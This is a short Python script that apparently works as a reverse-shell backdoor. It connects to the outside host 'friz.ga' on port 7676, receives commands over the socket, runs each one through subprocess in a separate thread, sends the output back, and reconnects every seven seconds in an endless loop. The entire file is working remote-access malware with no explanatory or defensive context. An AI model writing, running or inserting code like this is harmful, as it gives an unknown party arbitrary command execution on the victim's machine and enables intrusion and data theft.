import socket
import os
import subprocess
import threading
import time

sock = 0
print("eloo")
def exeCommand(msg):
    global sock
    try:
        output = subprocess.getoutput(msg)
    except Exception as err:
        output = err
    try:
        sock.send(bytes(output, 'utf-8'))
    except:
        pass

def startSocket():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 20000, 3000))
    sock.connect(('friz.ga', 7676))
    sock.send(b'2\r\n')

    while 1:
        output = ''
        data = sock.recv(1024)
        if not data:
            break

        msg = data.decode('UTF-8')
        print(len(msg))
        if msg == '\r\n':
            print('ping')
            sock.send(b'\r\n')
        else:
            print(msg)
            command = threading.Thread(target=exeCommand, args=(msg,))
            command.start()


while(1):
    try:
        startSocket()
    except Exception as e:
        print(e)
    time.sleep(7)